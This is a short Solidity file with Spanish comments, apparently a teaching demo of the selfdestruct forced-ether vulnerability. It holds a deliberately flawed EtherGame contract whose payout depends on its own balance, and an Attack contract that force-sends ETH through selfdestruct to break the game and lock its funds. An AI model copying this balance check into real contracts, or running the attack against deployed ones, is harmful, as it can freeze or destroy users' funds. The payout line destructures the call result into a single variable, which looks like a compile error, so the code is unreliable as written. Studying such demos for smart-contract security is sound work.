// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "Solo puedes enviar 1 ETH a la vez.");

        // Verificamos si hemos llegado a los 7 ETH.
        uint balance = address(this).balance;
        require(balance <= targetAmount, "El juego se ha terminado.");

        // Si llegamos al objetivo, seteamos la dirección del ganador para que reclame su premio.
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        // Solo el ganador puede reclamar su premio.
        require(msg.sender == winner, "No eres el ganador.");
        
        (bool sent) = msg.sender.call{value: address(this).balance}("");
        require(sent, "El envio del ETH ha fallado.");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        // Creamos la instancia de EtherGame.
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // Convertimos la dirección de EtherGame en payable.
        address payable addr = payable(address(etherGame));

        // Enviando de forma forzosa ETH a EtherGame, puedes romper el juego al igualar o superar los 7 ETH.
        selfdestruct(addr);
    }
}
